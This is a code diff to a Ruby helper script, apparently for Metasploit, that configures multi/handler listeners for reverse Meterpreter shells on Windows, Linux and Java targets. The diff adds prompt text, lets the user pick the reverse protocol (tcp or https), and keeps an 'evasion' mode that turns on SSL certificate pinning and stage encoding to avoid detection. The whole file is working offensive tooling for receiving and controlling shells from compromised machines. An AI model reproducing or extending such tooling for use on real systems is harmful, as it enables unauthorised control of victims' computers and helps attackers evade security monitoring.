@@ -28,6 +28,10 @@
       ## SIMPLE MULTI/HANDLER
       if user_input == "handler"
       ## User inputs
+      print_line("")
+      print_line("  Syntax : <payload platform>  <payload protocol>")
+      print_line("  Example: windows  tcp | windows https")
+      print_line("")
       print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
@@ -37,7 +41,7 @@
       end
       ## Store lhost address
       ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
-      print "[+] Use LHOST           : #{ip} (y/n)? : "
+      print "[+] Use LHOST addr      : #{ip}  (y/n) : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
@@ -48,7 +52,7 @@
             remote_host = "#{get_addr}"
          end
       ## Sellect lport number
-      print "[+] Use LPORT           : 666          (y/n)? : "
+      print "[+] Use LPORT number    : 666           (y/n) : "
       get_port = gets.chomp
          if get_port == "y" or get_port == "Y"
             remote_port = "666"
@@ -62,6 +66,10 @@
       ## MULTI/HANDLER AUTORUNSCRIPT
       elsif user_input == "resource"
       ## User inputs
+      print_line("")
+      print_line("  Syntax : <payload platform>  <payload protocol>")
+      print_line("  Example: windows  tcp | windows https")
+      print_line("")
       print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
@@ -71,7 +79,7 @@
       end
       ## Store lhost address
       ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
-      print "[+] Use LHOST           : #{ip} (y/n)? : "
+      print "[+] Use LHOST addr      : #{ip}  (y/n) : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
@@ -82,7 +90,7 @@
             remote_host = "#{get_addr}"
          end
       ## Sellect lport number
-      print "[+] Use LPORT           : 666          (y/n)? : "
+      print "[+] Use LPORT number    : 666           (y/n) : "
       get_port = gets.chomp
          if get_port == "y" or get_port == "Y"
             remote_port = "666"
@@ -103,6 +111,10 @@
 
       elsif user_input == "evasion"
       ## User inputs
+      print_line("")
+      print_line("  Syntax : <payload platform>  <payload protocol>")
+      print_line("  Example: windows  tcp | windows https")
+      print_line("")
       print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
@@ -112,7 +124,7 @@
       end
       ## Store lhost address
       ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
-      print "[+] Use LHOST           : #{ip} (y/n)? : "
+      print "[+] Use LHOST addr      : #{ip}  (y/n) : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
@@ -123,7 +135,7 @@
             remote_host = "#{get_addr}"
          end
       ## Sellect lport number
-      print "[+] Use LPORT           : 445          (y/n)? : "
+      print "[+] Use LPORT number    : 445           (y/n) : "
       get_port = gets.chomp
          if get_port == "y" or get_port == "Y"
             remote_port = "445"
@@ -150,20 +162,16 @@
       end
 
 
-      user_arch = `uname -m`
       ## Sellect session platform (payload)
-      if (user_platform =~ /Windows/i)
-         if user_arch =~ /i686/
+      parse_proto = user_platform.split(' ')[1]
+      if (user_platform =~ /windows/i)
+         if parse_proto.nil? or parse_proto == '' or parse_proto == ' '
             payload = "windows/meterpreter/reverse_tcp"
          else
-            payload = "windows/x64/meterpreter/reverse_tcp"
+            payload = "windows/meterpreter/reverse_#{parse_proto}"
          end
-      elsif (user_platform =~ /Linux/i)
-         if user_arch =~ /i686/
+      elsif (user_platform =~ /linux/i)
             payload = "linux/x86/meterpreter/reverse_tcp"
-         else
-            payload = "linux/x64/meterpreter/reverse_tcp"
-         end
       else
          payload = "java/meterpreter/reverse_tcp"
       end
@@ -178,7 +186,7 @@
          end
       run_single("set PAYLOAD #{payload}")
          ## set evasion options
-         if user_input == "evasion" or user_input == "Evasion"
+         if user_input == "evasion" or user_input == "EVASION"
             run_single("set HandlerSSLCert #{get_pem}")
             run_single("set StagerVerifySSLCert true")
             run_single("set EnableStageEncoding true")
